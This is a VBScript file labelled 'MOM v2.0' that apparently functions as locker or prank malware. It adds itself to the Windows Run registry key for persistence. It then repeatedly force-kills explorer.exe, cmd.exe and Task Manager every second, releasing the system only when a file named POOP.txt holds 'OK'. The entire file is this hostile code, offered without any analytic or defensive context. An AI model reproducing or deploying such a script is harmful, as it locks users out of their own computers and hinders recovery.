'MOM v2.0 
'File "2.vbs"
'Copyright Debayan Sutradhar 2016
On Error Resume Next
Set shell=CreateObject("WScript.Shell")
Set fso=CreateObject("Scripting.FileSystemObject")
shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MOM2",WScript.ScriptFullName,"REG_SZ"
path1=WScript.ScriptFullName
path2=WScript.ScriptName
path=Replace(path1,path2,"")
Do 
shell.Run "taskkill /F /IM explorer.exe",0
shell.Run "taskkill /F /IM cmd.exe",0
shell.Run "taskkill /F /IM Taskmgr.exe",0
WScript.Sleep 1000
If fso.FileExists(path&"POOP.txt") then
Set check=fso.OpenTextFile(path&"POOP.txt",1)
line=check.ReadLine
check.Close
If line="OK" Then 
Set check1=fso.OpenTextFile(path&"POOP.txt",2)
line=check.WriteLine(Null)
check1.Close
shell.Run "explorer.exe"
WScript.Quit
end if 
End If
Loop 
